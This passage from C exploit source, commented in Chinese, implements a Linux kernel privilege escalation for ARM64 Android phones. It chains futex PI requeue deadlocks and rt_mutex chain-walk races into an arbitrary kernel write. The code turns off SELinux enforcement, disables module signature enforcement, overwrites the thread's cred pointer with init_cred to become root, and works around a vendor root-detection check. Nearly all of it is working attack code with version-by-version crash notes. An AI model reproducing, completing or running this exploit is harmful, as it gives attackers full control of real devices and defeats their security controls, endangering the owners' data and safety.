     *     parent = 0x01010100，读 *(0x01010140) ⇒ PAN Oops（地址吻合日志）
     *
     * ── 绕行原理：让 0x81d4 那条 str 根本不执行 ──
     *   0x7fd0 的 b.eq 只在 (value & ~3) == 0 时成立。
     *   只要 value 是"4 字节对齐的内核地址"，就落到：
     *     0x7fd4 ldr x10,[x9,#16]   读 *(value+0x10)
     *     0x7fd8 cmp x10,x0
     *     0x7fe0 str x8,[x9,#8]     写 *(value+0x08) = target
     *     0x7fe4 ret                ★直接返回
     *   ⇒ fake_lock->waiters.rb_root 保持 0 ⇒ rt_mutex_enqueue 的
     *     while (*link) 一次都不进 ⇒ 走 rb_link_node(parent=NULL) +
     *     rb_insert_color_cached(leftmost=true)，只写 fake_lock 自身
     *     和栈上的 waiter，**不再有任何越界遍历**。
     *
     * ── 取值设计（scr = bm_pmd，.bss 全零页，只有 [0] 项被 fixmap 用）──
     *   target = selinux_state + 1        （enforcing 所在字节，sel_read_enforce
     *                                      反汇编 ldrb w3,[x8,#1] 已证实）
     *   value  = scr + 0x800
     *     byte0 = 0x00 → enforcing = 0（Permissive）✅
     *     byte1 = 0x08 → checkreqprot = true（Permissive 下不影响判定）
     *     byte2 = 0x84 → initialized 非 0，SELinux 不早退
     *     value & ~3 = scr+0x800（≠0）⇒ 走上面那条安全分支
     *     scr+0x810 全零可读；scr+0x808 可写（写进 bm_pmd 页内，无害）
     *
     * ── fake_lock 的字段要求（scr+0x40 / scr+0xC0，两轮不同）──
     *   +0x00 wait_lock = 0        raw_spin_trylock 的 cmpxchg(0→1) 成功；
     *                             _raw_spin_unlock 用 stlrb 写回 0，成对无残留
     *   +0x08 waiters.rb_root = 0  enqueue 的 while(*link) 不进入
     *   +0x10 waiters.rb_leftmost = 0
     *   +0x18 owner = 0            → rtmutex.c:702 !rt_mutex_owner(lock) 成立
     *   ⚠️ 两轮必须换地址：第 1 轮 rb_insert_color_cached(leftmost=true) 会把
     *      *(lock+0x10) 写成 &waiter->tree_entry；第 2 轮 rb_erase 的
     *      0x7f58 一旦读到 *(lock+0x10) == node 就跳 0x7fb0 歧路。
     *
     * ── 702/708 的两个连带分支（都已核实安全）──
     *   708 行 `prerequeue_top_waiter != rt_mutex_top_waiter(lock)`：
     *     enqueue 后 leftmost = &waiter->tree_entry ⇒ top_waiter 非 NULL，
     *     与 prerequeue(NULL) 不等 ⇒ 会调用 wake_up_process(waiter->task)。
     *     故 waiter->task 填 init_task（真实 task_struct）：
     *       p->state（init_task 为 TASK_RUNNING≠0，其实这里 state=0 的
     *       swapper 直接让 `!(p->state & TASK_NORMAL)` 成立）⇒
     *       try_to_wake_up @ 0x82a0608 `tst` + `b.eq 0x6c4` 立即早退，
     *       不进 ttwu_do_activate，安全。
     *   702 行 !rt_mutex_owner(lock) ⇒ raw_spin_unlock_irq 后 return 0，
     *     不会去 get_task_struct(owner)。
     * ══════════════════════════════════════════════════════════════════ */
    do_stamp(g_target_rt, g_value,
             g_fake_lock);
    __atomic_store_n(&g_stamped, 1, __ATOMIC_RELEASE);

    /* ★★★ v78i 关键修正：第 1 轮不再是"喷一次就等"，而是"边等边反复喷" ★★★
     *
     * 为什么必须这样（这次 +0x154 崩溃的根因）：
     *   喷射落点是 ___sys_sendmsg 的内核栈帧（T-0x1e8 一带），那块内存在
     *   futex 返回之后是【已废弃的栈空间】，位于当前 sp 之下。任何一次
     *   IRQ / 异常 / 更深的内核调用都会从当前 sp 往下压栈，
     *   而 T-0x1e8 正好在这个可达范围里。
     *   v76i：第 1 轮没命中（所以没在 P_ADDR 上 PAN 崩，直接早退），第 2 轮命中；
     *   v77i：两轮都没命中 → rb_erase 的 `RB_EMPTY_NODE` 早退 → 完全没有写，
     *         而 rt_mutex_adjust_pi 用真实 waiter->lock（内核栈地址）继续
     *         走 chain walk，最后在 rt_mutex_top_waiter 的
     *         BUG_ON(w->lock != lock) 上读 *(0x30+0x38)=0x68 崩溃
     *         —— 与本次 Oops (pc=+0x154, addr=0x68, x22=栈地址) 完全吻合。
     *
     * 修法：在触发窗口内反复调用 do_stamp（每轮写的字节完全相同，
     *   不是"撕裂"状态），把"陈旧窗口"从 80ms 压到一次 sendmsg 的量级。
     *   触发方（th_probe）一旦 sched_setscheduler 进入内核，
     *   waiter 三字段几乎必然是刚刷进去的正确值。
     *
     * ⚠️ 仍然绝不能调用 sched_yield()/usleep()/printf()：都是 syscall。
     *    这里用的 do_stamp 是【故意】的 syscall —— 它正是喷射动作本身。 */

    /* ★ 纯用户态自旋等 th_probe 完成唯一的 chain walk，期间反复刷新喷射 */
    for (;;) {
        int d = __atomic_load_n(&g_probe_done, __ATOMIC_ACQUIRE);
        if (d >= 1) break;
        do_stamp(g_target_rt, g_value,
                 g_fake_lock);
    }

    /* ══════════════════════════════════════════════════════════════════
     * ★★★ v80i：本进程只做【一次】chain walk，绝不做第二次 ★★★
     *
     * v79i 实测崩溃（Oops: rt_mutex_adjust_prio_chain+0x650, BUG_ON）：
     *   x22 = 0xffffff95b204d040 - slide = 0xffffff800ae4d040 = bm_pmd+0x40
     *       = SCR_LOCK1  ← 崩溃时用的 lock 仍是 lock1！
     *   x8  = *(lock1+0x10) = rb_first_cached 取出的 leftmost，为陈旧非零值
     *   ⇒ rt_mutex_top_waiter(lock1) 取出 w，BUG_ON(w->lock != lock1) 炸
     *
     * 根因（结构性，不是时序）：
     *   第 1 轮的 rt_mutex_enqueue → rb_insert_color_cached(leftmost=true)
     *   会把 *(lock1+0x10) 写成 &waiter->tree_entry（内核栈地址）。
     *   同一进程再触发一次 chain walk，rt_mutex_top_waiter(lock1) 就会
     *   读到这个陈旧指针，把它当 waiter 解引用 ⇒ 必然 BUG。
     *   换 SCR_LOCK2 也没用：崩溃现场证明 chain walk 用的仍是 lock1，
     *   因为 waiter->lock 是喷射进去的，两轮之间没有机会改它。
     *
     * v78i 之所以成功，正是因为它【只做一轮】：
     *   日志 "enforce already 0 -> skip round2 (no extra gamble)"。
     *
     * 结论：一次进程 = 一次 chain walk = 一个目标。
     *   要写第二个目标就再跑一次进程（每次进程天然带一次全新 futex/
     *   全新 waiter/全新内核栈，互不污染）。这是 v79i 想省的那次
     *   fork 换来的稳定性，完全值得。
     * ══════════════════════════════════════════════════════════════════ */

    /* ⚠️ 绝不能用 sched_yield()/usleep()/printf()：都是 syscall。
     *    asm volatile("yield") 只发 AArch64 YIELD 指令，留在 EL0。 */
    for (;;) __asm__ volatile("yield" ::: "memory");
    return NULL;
}

/* th_owner: 先持有 F_TARGET, 再抢 th_waiter 持有的 F_CHAIN,
 * 与 th_waiter(F_WAIT 上等待 F_TARGET) 形成 PI 死锁环。
 * 主线程 CMP_REQUEUE_PI 时内核检测到 EDEADLK 回滚 → rb_erase → 写入 */
static void *th_owner(void *a) {
    long r;

    pthread_setname_np(pthread_self(), "gl_own");
    tmarkf("GL O:in");

    /* 等 th_waiter 已在 F_WAIT 上挂起 */
    for (int i = 0; i < 5000 && !w_waiting; i++) usleep(1000);
    if (!w_waiting) {
        printf("[!] th_owner: waiter never went to wait\n");
        o_armed = -1;
        return NULL;
    }

    /* 1) LOCK_PI F_TARGET → th_owner 持有 target 锁 */
    r = fx(&F[F_TARGET], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    if (r) {
        printf("[!] th_owner: LOCK_PI F_TARGET failed r=%ld errno=%d\n", r, errno);
        o_armed = -1;
        return NULL;
    }

    /* 标记已持有 F_TARGET, 即将去抢 F_CHAIN
     * ⚠️ 必须在 LOCK_PI F_CHAIN 之前设置, 让主线程知道死锁环已成形 */
    __atomic_store_n(&o_armed, 1, __ATOMIC_RELEASE);

    /* 2) 抢 F_CHAIN → 与 th_waiter 形成死锁
     *    th_waiter: 持 F_CHAIN, 等 F_TARGET (WAIT_REQUEUE_PI)
     *    th_owner : 持 F_TARGET, 等 F_CHAIN (LOCK_PI) */
    struct timespec lt;
    clock_gettime(CLOCK_REALTIME, &lt);
    lt.tv_nsec += 500000000L;      /* 0.5s 早让位 */
    if (lt.tv_nsec >= 1000000000L) {
        lt.tv_sec++;
        lt.tv_nsec -= 1000000000L;
    }

    r = fx(&F[F_CHAIN], FUTEX_LOCK_PI, 0, &lt, NULL, 0);
    /* 死锁: ret=-1 errno=EDEADLK, 或超时 -ETIMEDOUT → remove_waiter → rb_erase */
    o_lock_ret = r; o_lock_err = errno;
    tmarkf("GL O:chain r=%ld e=%d", r, errno);

    /* ★★★ 早让位后【直接 return】。
     *
     * 设计要点："rt+0.5 早让位 ⇒ probe 成 sole waiter"，结尾就是 return NULL。
     *
     * 为什么必须让它退出（这是 PJU110 一直 Miss 的根因）：
     *   若 th_owner 死抱 F_TARGET 不放，F_TARGET 的所有者永远在线，
     *   th_waiter 在 F_WAIT 上就只能【等满超时】：
     *     futex_wait_requeue_pi (futex.c:3483)
     *       → rt_mutex_wait_proxy_lock  → 返回 -ETIMEDOUT
     *       → rt_mutex_cleanup_proxy_lock (futex.c:3486)
     *           → remove_waiter (rtmutex.c:1936)
     *               → current->pi_blocked_on = NULL      ← 悬空指针被清掉
     *   之后 probe 进入 rt_mutex_adjust_prio_chain，
     *     rtmutex.c:522  waiter = task->pi_blocked_on;  → NULL
     *     rtmutex.c:523  goto out_unlock_pi;            ← 573 行根本没到
     *   ⇒ 喷射数据虽在栈上，但内核已不再引用 ⇒ rb_erase 永不执行 ⇒ Miss。
     *
     *   反之若 th_owner 早让位并退出，F_TARGET 所有者消失 / 锁被放弃，
     *   th_waiter 会在 F_WAIT 上被【提前唤醒】：
     *     handle_early_requeue_pi_wakeup (futex.c:3438) 返回非 0
     *       → futex.c:3441  goto out_put_keys      ← 绕过 cleanup
     *   ⇒ rt_waiter 仍留在 rt_mutex 树上，pi_blocked_on 悬空保留 ✅
     *   ⇒ probe 的 chain walk 能取到 waiter，走到 573 行并进入 668 行 rb_erase。
     *
     * 判别标志（trace 里已有）：超时分支 errno=110(ETIMEDOUT)，
     *   早唤醒分支 errno=11(EWOULDBLOCK) 或 4(EINTR)。
     *   之前日志一直是 e=110，说明走的是超时分支 —— 这就是 Miss 的直接证据。 */
    /* ★★★ v75i：这里【绝不能】UNLOCK_PI ★★★
     *
     * v74i 实测日志铁证：加 unlock 之后
     *   ring         F1=0x00003eb3   (requeue 前)
     *   post-requeue F1=0x80003eb3   (requeue 后，WAITERS 位 = 0x80000000 已置上)
     *   diag         F1=0x00000000   ← unlock 把整个 futex word 清成 0
     * 而 w_wait 仍是 -1/110，probe 仍 -1/110，enforce 仍 1。
     *
     * 原因：th_waiter 在 EDEADLK 那一刻已经被
     *   rt_mutex_start_proxy_lock → remove_waiter → rt_mutex_dequeue
     * 从 F_TARGET 的 waiters 树上摘掉了。
     * 此时 UNLOCK_PI 只会做：
     *   __rt_mutex_futex_unlock → rt_mutex_has_waiters()==false
     *   → lock->owner = NULL，直接返回 false —— 没有任何 waiter 可唤醒。
     * 净效果只有三个坏处：
     *   1) F_TARGET 的 futex word 被清成 0（日志 F1=0x00000000 实证）
     *   2) th_owner 失去 F_TARGET 所有权，它的 pi_blocked_on 链跟着断
     *   3) 后续任何以 F_TARGET 为 orig_lock 的 chain walk 都会在
     *      rtmutex.c:529 `if (orig_waiter && !rt_mutex_owner(orig_lock))` 早退
     * ⇒ 所以这里是纯损失，必须保留所有权、什么都不做、原地自旋保活。 */

    o_lock_ret = r; o_lock_err = errno;
    printf("[*] th_owner: LOCK_PI F_CHAIN ret=%ld errno=%d, 保持 F_TARGET 所有权\n",
           r, o_lock_err);
    for (;;) __asm__ volatile("yield" ::: "memory");
    return NULL;
}

/* th_probe: 等 stamp 完成后用 FUTEX_LOCK_PI F_CHAIN 踩树
 *
 * ── 为什么不是 CMP_REQUEUE_PI（勿再改回去）──
 *   rtmutex.c:573  if (rt_mutex_waiter_equal(waiter, task_to_waiter(task))) {
 *                      if (!detect_deadlock) goto out_unlock_pi;   // MIN
 *                      else requeue = false;                       // FULL
 *                  }
 *   rtmutex.c:617  if (!requeue) { ... goto again; }   ← 同样到不了 668
 *   rtmutex.c:668  rt_mutex_dequeue(lock, waiter);     ← rb_erase 唯一入口
 *   ⇒ 573 判"相等"时，MIN 和 FULL 都跳过 rb_erase。FULL 只让链走更长，不是解锁条件。
 *   ⇒ CMP_REQUEUE_PI 既换不来 FULL（它的代理抢锁在 futex_proxy_trylock_atomic 里
 *     走 attach_to_pi_owner → rt_mutex_init_proxy_locked，不做 chain walk），
 *     也解决不了 573 的比较问题。属于无效改动，已回退。
 *
 *   真正决定命中与否的是：th_waiter->pi_blocked_on->prio != th_waiter->prio
 *   （喷射值 0x7fffffff vs 120，本应不相等）+ th_waiter->pi_blocked_on 必须非 NULL。
 *   若 pi_blocked_on 已被 rt_mutex_cleanup_proxy_lock 清空，则 522 行
 *   "if (!waiter) goto out_unlock_pi" 会在到达 573 之前就退出 —— 这是当前最大嫌疑。 */
static volatile int pr_ret = 0, pr_err = 0;

/* 前置声明：th_probe 在第 1 轮后要立刻复查 enforce 以决定是否收手，
 * 而 read_enforce 的定义在其后（第 875 行），必须先声明。 */
static int read_enforce(void);
static int read_sig_enforce(void);
static void *th_probe(void *a) {
    int saw_stamp = 0;

    pthread_setname_np(pthread_self(), "gl_prb");
    tmarkf("GL P:in");

    /* ── 阶段 1：等 th_waiter 把探针 waiter 喷到 P_ADDR 目标上 ── */
    for (int i = 0; i < 10000; i++) {
        if (__atomic_load_n(&g_stamped, __ATOMIC_ACQUIRE) >= 1) {
            saw_stamp = 1;
            break;
        }
        usleep(1000);
    }
    if (!saw_stamp) {
        printf("[!] stamp1 timeout (10s)\n");
        return NULL;
    }

    /* ★★★ v78i 关键修正：不能在这里 usleep(80000) ★★★
     * 原时序是"saw_stamp → 睡 80ms → 触发"。但 th_waiter 已经改成
     * "边等边反复喷"，喷射区在【触发那一刻】才是新鲜的。
     * 睡 80ms 会让 th_waiter 空转几千次 sendmsg，虽然一直在刷，
     * 但真正的问题是：这 80ms 里 th_waiter 一直在发 syscall，
     * 而不是立刻进入等待；且触发点与最后一次 sendmsg 的相对位置完全随机。
     * 现在改为：一看到 stamp 就立刻触发，让触发紧跟在一次
     * sendmsg 之后（喷射区最新鲜的那一刻）。
     * 真正需要对齐的"落栈完成"由 g_stamped 的 release 语义保证。 */

    struct sched_param sp;
    memset(&sp, 0, sizeof(sp));
    sp.sched_priority = 0;

    /* ══════════════════════════════════════════════════════════════════
     * ★★★ v80i：单次 chain walk —— 结构与已验证成功的 v78i 完全一致 ★★★
     *
     * g_target_rt 由 main 按 argv 决定：
     *   argv[1]=selinux → selinux_state+1（关 SELinux）
     *   argv[1]=sig     → sig_enforce   （关模块强签）
     * 每跑一次进程只打一个目标，绝不在同一进程里打第二个。
     * 原因见 th_waiter 里的大段注释（rb_leftmost 被第 1 轮写脏）。
     *
     * 为什么两个目标能共用同一套喷射布局：
     *   两者都是「把某地址的第 0 字节写成 0x00」，且写入值
     *   = bm_pmd+0x800（页对齐，byte0=0x00，&~3≠0）走的是
     *   0x7fd4→0x7fe0→ret 那条不污染 rb_root 的分支，与目标地址无关。
     *   唯一要求是 target 8 字节对齐 —— sig_enforce 在 0x...9f0，
     *   是 16 字节对齐的，完全满足。
     * ══════════════════════════════════════════════════════════════════ */
    g_dbg_stamp_us = now_us();
    errno = 0;
    long r1 = syscall(__NR_sched_setscheduler, (pid_t)g_waiter_tid,
                      SCHED_BATCH_POLICY, &sp);
    pr_ret = (int)r1;
    pr_err = errno;
    g_dbg_probe_us = now_us();
    tmarkf("GL P:r1 r=%ld e=%d", r1, errno);
    printf("[*] walk sched_setscheduler(tid=%d,BATCH) ret=%ld errno=%d target=0x%lx\n",
           (int)g_waiter_tid, r1, pr_err, (unsigned long)g_target_rt);
    __atomic_store_n(&g_probe_done, 1, __ATOMIC_RELEASE);

    /* ── 判决（只读，不再触发任何 chain walk）── */
    {
        int enf_now = read_enforce();
        int sig_now = read_sig_enforce();
        tmarkf("GL P:enf=%d sig=%d", enf_now, sig_now);
        printf("[*] post-walk: enforce=%d sig_enforce=%d\n", enf_now, sig_now);
    }

    __atomic_store_n(&g_probe_done, 2, __ATOMIC_RELEASE);
    return NULL;
}

/* ── 直接读 enforce（唯一有效的判据）── */
static int read_enforce(void) {
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0) return -1;
    char b[8];
    int n = (int)read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = 0;
    return atoi(b);
}
/* ── v81：读 kptr_restrict（/proc/sys/kernel/kptr_restrict，内容 "2\n"）── */
static int read_kptr(void) {
    int fd = open("/proc/sys/kernel/kptr_restrict", O_RDONLY);
    if (fd < 0) return -1;
    char b[16];
    int n = (int)read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = 0;
    return atoi(b);
}
/* ── v81：读 panic_on_oops（/proc/sys/kernel/panic_on_oops，内容 "1\n"）── */
static int read_panic_oops(void) {
    int fd = open("/proc/sys/kernel/panic_on_oops", O_RDONLY);
    if (fd < 0) return -1;
    char b[16];
    int n = (int)read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = 0;
    return atoi(b);
}
/* ── 读 sig_enforce（v79i 新增判据）──
 * /sys/module/module/parameters/sig_enforce 内容是 "Y\n" 或 "N\n"。
 * 返回 1=Y（强制签名，未签名模块被拒）、0=N（放行）、-1=读取失败。
 * 该文件 0644 且属主 root，shell 可读（实测 `cat` 成功）。 */
static int read_sig_enforce(void) {
    int fd = open("/sys/module/module/parameters/sig_enforce", O_RDONLY);
    if (fd < 0) return -1;
    char b[8];
    int n = (int)read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -1;
    b[n] = '\0';
    return (b[0] == 'Y' || b[0] == '1' || b[0] == 'y') ? 1 : 0;
}

/* ── child_body ── */
static int child_body(void) {
    /* 子进程重新 MAP_FIXED T/P/R/Q (memfd fd 已继承, offset 0x1000) */
    if (mmap((void*)T_ADDR, 0x4000, PROT_READ | PROT_WRITE,
             MAP_FIXED | MAP_SHARED, g_mfd, 0x1000) != (void*)T_ADDR) {
        perror("child mmap");
        return 2;
    }

    /* touch 页建立 PTE */
    { volatile unsigned long *tp = (volatile unsigned long*)T_ADDR;
      unsigned long v0 = tp[0]; tp[0] = v0; }
    { volatile unsigned long *pp = (volatile unsigned long*)P_ADDR;
      unsigned long v1 = pp[7]; pp[7] = v1; }
    { volatile unsigned long *qp = (volatile unsigned long*)Q_ADDR;
      unsigned long q0 = qp[0]; qp[0] = q0; }

    pthread_t tw, to, tp;

/* ══════════════════════════════════════════════════════════════════════════
     * ★★★ v82 第二步：泄漏【本线程（子进程主线程）】的 task_struct ★★★
     *
     * ── 为什么要泄漏"主线程"而不是"跑 do_stamp 的那个线程" ──
     *   Linux 的 task_struct->cred 是 per-thread 的：每个线程有自己独立的
     *   cred 指针字段（虽然通常都指向同一个 cred 对象）。
     *   而 do_stamp 的 target 是【任意地址】——它由 th_waiter 线程执行写入，
     *   但写到哪里完全由我们指定。
     *
     *   ⇒ 所以最干净的方案：泄漏【主线程】的 task_struct，
     *     target = 主线程 task + 0x768。
     *     这样 th_waiter 只是"执行写入的手"，被改的是主线程的 cred 指针。
     *     写完主线程 getuid() == 0，直接就是 root。
     *
     *   如果反过来去改 th_waiter 自己的 cred，那么只有那个线程是 root，
     *   主线程仍然是 shell —— 完全没用。
     *
     * ── 为什么泄漏必须在这里（pthread_create 之前）──
     *   ① perf_event_open(pid=0) 采的是【调用者所在线程】的 current，
     *      在主线程调用才能拿到主线程的 task_struct。
     *      第一步实测：主线程与工作线程的 task 相差 0x11736f80。
     *   ② 此时 th_waiter 还没启动，泄漏耗时（最多 5 轮 × 1200 次 setuid）
     *      不会打乱任何 futex / PI 链的时序。
     *
     * ── 泄漏期间的 setuid 会不会有副作用 ──
     *   不会。setuid(getuid()) 是 no-op 语义（uid 不变），只是走一遍
     *   prepare_creds + commit_creds 的内核路径，为我们创造采样机会。
     *   它不会改变 task_struct 的地址，也不会改变它的 cred 指针。
     * ══════════════════════════════════════════════════════════════════════ */
    if (g_mode == MODE_CRED) {
        unsigned long cc_rt = LINK_COMMIT_CREDS + g_slide;
        unsigned long mytask = leak_task_retry(cc_rt, "main");

        if (!mytask) {
            printf("[-] v82: 主线程泄漏失败，放弃（不做 do_stamp，不消耗 slot）\n");
            return 1;
        }
        g_task_self = mytask;

        /* ── 写入参数计算与校验 ── */
        unsigned long tgt = mytask + TASK_CRED;
        unsigned long val = LINK_INIT_CRED + g_slide;

        printf("[v82] task_struct = 0x%lx\n", mytask);
        printf("[v82]   -> cred 槽 target = task+0x%lx = 0x%lx\n", TASK_CRED, tgt);
        printf("[v82]   -> 写入值 value = init_cred = 0x%lx\n", val);

        /* target 校验：内核堆地址、8 字节对齐 */
        if (tgt < 0xffffffc000000000UL || (tgt & 7UL)) {
            printf("[-] v82: target 0x%lx 非法（非内核堆地址或未 8 字节对齐），拒绝\n", tgt);
            return 1;
        }
        /* value 校验：必须让 rb_erase 走 +0x7fd4/+0x7fe0 安全分支
         * 判据是 `ands x9,x10,#~3; b.eq` —— 只有 value & ~3 == 0 才走脏分支。 */
        if ((val & ~3UL) == 0) {
            printf("[-] v82: value 0x%lx 会走 0x81d4 脏分支（污染 rb_root），拒绝\n", val);
            return 1;
        }
        /* value 必须落在 .data 可写段：[_sdata, __bss_start) + slide
         * 这段的二次访问 *(val+0x10) / *(val+0x08) 才是安全的。 */
        {
            unsigned long sdata = 0xffffff800aa50000UL + g_slide;
            unsigned long bss   = 0xffffff800ae4b800UL + g_slide;
            if (val < sdata || val + 0x20 > bss) {
                printf("[-] v82: value 0x%lx 不在可写 .data [0x%lx,0x%lx)，拒绝\n",
                       val, sdata, bss);
                return 1;
            }
            printf("[v82]   .data 可写段校验通过 [0x%lx, 0x%lx)\n", sdata, bss);
        }

        /* 交给 th_waiter 里那次 do_stamp 使用。
         * ★ 必须用原子存储：g_value 会被 th_waiter 线程读取，
         *   普通赋值在 -O2 下可能被缓存在寄存器里，或读到撕裂值。 */
        __atomic_store_n(&g_target_rt, tgt, __ATOMIC_RELEASE);
        __atomic_store_n(&g_value, val, __ATOMIC_RELEASE);
        printf("[v82] 已设置 g_target_rt=0x%lx g_value=0x%lx\n", tgt, val);
        printf("[v82] 注意：init_cred+8 会被 rb_erase 的 str x8,[x9,#8] 覆写，\n"
               "      但只影响 gid/suid，uid/euid/fsuid 与 cap 位不受影响。\n");
    }

    pthread_create(&tw, NULL, th_waiter, NULL);
    for (int i = 0; i < 300 && !w_held; i++) usleep(1000);
    if (w_held != 1) {
        printf("[!] waiter chain failed\n");
        return 1;
    }

    usleep(5000);

    pthread_create(&to, NULL, th_owner, NULL);
    /* 等 th_owner 完成 LOCK_PI F_TARGET 并开始抢 F_CHAIN */
    for (int i = 0; i < 300 && !o_armed; i++) usleep(1000);
    if (o_armed != 1) {
        printf("[!] owner arm failed (o_armed=%d)\n", o_armed);
        return 1;
    }

    usleep(20000);

    printf("[*] ring: F0=0x%08x F1=0x%08x F2=0x%08x\n", F[0], F[1], F[2]);
    tmarkf("GL M:ring F0=%08x F1=%08x F2=%08x", F[0], F[1], F[2]);

    int e = 0;
    long r = fx(&F[F_WAIT], FUTEX_CMP_REQUEUE_PI, 1,
                (const void*)1L, &F[F_TARGET], 1);
    e = errno;
    printf("[*] requeue: ret=%ld errno=%d (%s)\n", r, e, en(e));
    tmarkf("GL M:requeue r=%ld e=%d", r, e);
    printf("[*] post-requeue: F0=0x%08x F1=0x%08x F2=0x%08x\n",
           F[0], F[1], F[2]);

    if (!(r == -1 && e == 35)) return 1;  /* EDEADLK expected */

    /* ★★★ 权威时序（child_body）：
     *   requeue 返回 -EDEADLK 时，路 A（入队 walk）已可能触发 rb_erase 任意写；
     *   之后创建 th_probe，等 th_waiter 3s 超时 + do_stamp 完成后，
     *   probe 踩 F_CHAIN 触发路 B（超时 unwind）rb_erase = trylock 写。
     *   ★ 关键：绝不主线程 LOCK_PI/UNLOCK_PI F_TARGET——F_TARGET 的 owner TID
     *     (th_owner) 已随线程退出而失效，再碰必 ESRCH。这里只碰 F_CHAIN。 */
    pthread_create(&tp, NULL, th_probe, NULL);
    /* ══════════════════════════════════════════════════════════════════════
     * ★★★ v82b 关键修正：这里绝不能用 usleep() ★★★
     *
     * 旧代码是：
     *     for (int i = 0; i < 80; i++) {
     *         if (g_probe_done >= 2) break;
     *         usleep(100000);          ← 致命
     *     }
     * 死因：主线程躺在 nanosleep 里时，th_waiter 把本线程 cred 改成
     *   &init_cred；主线程从 nanosleep 返回，oplus_invoke_syscall 出口
     *   重读 uid=0 < 入口快照 2000 ⇒ b.cc ⇒ oplus_root_check_succ
     *   ⇒ do_group_exit(9) 杀整个进程组 ⇒ 连 probe_done 那行都打不出来。
     *
     * 改为纯 EL0 自旋：等待期间不发任何 syscall，写入时刻主线程没有
     *   "入口快照"。等它下次真正调 printf 时入口 uid 已经是 0，
     *   `cbz w20` 免检通道自然生效。
     * ══════════════════════════════════════════════════════════════════════ */
    for (int i = 0; i < 80; i++) {
        if (__atomic_load_n(&g_probe_done, __ATOMIC_ACQUIRE) >= 2) break;
        spin_ms(100);          /* 等效 100ms，但全程留在 EL0 */
    }
    /* ★ 此刻如果 cred 已被改写成功，我们已经"隐身"（入口 uid==0）。
     *   先把结果写进共享 futex 页的空闲字 F[3..5]（0/1/2 是 futex 用的），
     *   这样即使随后立刻被风控杀掉，父进程仍能从共享页读到判决。
     *   ⚠️ 这里的 getuid() 是【写入之后】第一个 syscall：
     *      若 cred 已改成 init_cred，它的入口快照本身就是 uid=0
     *      ⇒ cbz w20 免检，不会被拦。这正是改动生效的证据。 */
    if (g_mode == MODE_CRED) {
        unsigned int g0 = (unsigned int)getuid();
        F[3] = g0;
        F[4] = (unsigned int)geteuid();
        F[5] = (unsigned int)__atomic_load_n(&g_probe_done, __ATOMIC_ACQUIRE);

        /* ══════════════════════════════════════════════════════════════
         * ★★★ v82f 关键修复：立即「固化」cred，堵住 init_cred.usage 泄漏 ★★★
         *
         * ── 上一次重启的真正死因（已由 Oops 现场证实）──
         *   pc  : kmem_cache_free+0x50/0x720
         *   lr  : put_cred_rcu+0x7c/0x9c
         *   x20 : ffffffa5296fcf78   ← init_cred
         *   x1  : ffffffa5296fcf78   ← 传给 kmem_cache_free 的对象 = init_cred
         *   x0  : fffffff287c05000   ← cred_jar
         *
         *   我们把 task->cred 直接指向静态的 init_cred，但【没有 get_cred()】，
         *   即没有增加它的引用计数。而进程退出时 exit_creds() 会：
         *       put_cred(tsk->cred)  →  atomic_dec(&init_cred.usage)
         *   一旦 usage 减到 0，put_cred_rcu 就调
         *       kmem_cache_free(cred_jar, &init_cred)
         *   —— 把 .data 段的静态对象当 slab 对象释放 ⇒ 读到垃圾页头 ⇒
         *      缺页 ⇒ panic_on_oops=1 ⇒ MTK ipanic 抓 dump 后重启。
         *
         *   init_cred.usage 初值 = 4（INIT_CRED_USAGE）。
         *   我们跑了 4 次（0x640 / 0x780 / 0x700 / 0x6C0）：
         *       4 → 3 → 2 → 1 → 0
         *   前三次没崩，只是"预算"还没用完。第四次必然崩。完全吻合日志。
         *
         * ── 修复原理 ──
         *   提权成功（g0==0）后立刻调 setresuid/setresgid：
         *
         *     setresuid(0,0,0):
         *        __sys_setresuid → prepare_creds() → get_cred(old)  ⇒ usage +1
         *                       → commit_creds(new) → put_cred(old)  ⇒ usage -1
         *        ⇒ 净变化 0，init_cred.usage 不泄漏 ✅
         *        ⇒ task->cred 与 task->real_cred 都指向【新的 slab 副本】
         *        ⇒ 此后进程退出只释放那份副本，与 init_cred 无关 ✅
         *
         *   额外收益：
         *     · 新副本是从 init_cred memcpy 来的 ⇒ uid/euid/fsuid 全 0、
         *       cap_* 全 0x3fffffffff ⇒ 权限完整保留
         *     · setresuid(0,0,0) 会把 suid 也写成 0，
         *       顺手清掉 rb_erase 副作用留下的 suid=0xfffffff2
         *     · real_cred 也被换成同一副本 ⇒ /proc/self/status 的
         *       CapEff/Uid 行从此也显示正确（不再"看起来没提权"）
         *
         * ⚠️ 必须在任何 printf 之前做：printf 是 syscall，虽然入口 uid 已是 0
         *    （cbz w20 免检），但万一失败我们要尽早知道。
         * ⚠️ 必须在进程退出之前做：退出就来不及了。
         * ══════════════════════════════════════════════════════════════ */
        /* ══════════════════════════════════════════════════════════════════
         * ★★★ v82g 关键修正：用 fork() 归一化 cred，绝不用 setresuid ★★★
         *
         * ── 上一次重启的死因（已由 Oops 现场证实）──
         *   Kernel BUG at commit_creds+0x264/0x284
         *   pc : commit_creds+0x264
         *   lr : __sys_setresgid+0xfc
         *   x20: fffffff47da33180   ← old = task->real_cred（仍是 shell cred）
         *   x8 : ffffffa852afcf78   ← init_cred（= 0xffffff800aafcf78 + slide）
         *
         *   commit_creds() 的第一条语句是：
         *       const struct cred *old = task->real_cred;
         *       BUG_ON(task->cred != old);        ← 这里炸
         *   我们只把 cred 改成了 &init_cred，real_cred 仍是原 shell cred，
         *   两者不等 ⇒ 任何走到 commit_creds 的路径都会 panic。
         *   setresuid/setresgid、execve 全部走 commit_creds
         *   ⇒ 上一轮加的那两行 setresgid/setresuid 就是自杀。
         *
         * ── 正确做法：fork() ──
         *   fork → copy_process → copy_creds()：
         *       new = prepare_creds();      // 从 current->cred(=init_cred)
         *                                   //   memcpy 出一份【全新 slab cred】
         *       p->cred = p->real_cred = get_cred(new);
         *   ⇒ 子进程的 cred 和 real_cred 【指向同一个新对象】⇒ 归一化完成
         *   ⇒ 且 copy_creds 不调用 commit_creds ⇒ 不会触发 BUG_ON ✅
         *   ⇒ 新对象是真正的 slab 对象，退出发放时走 cred_jar，完全正常 ✅
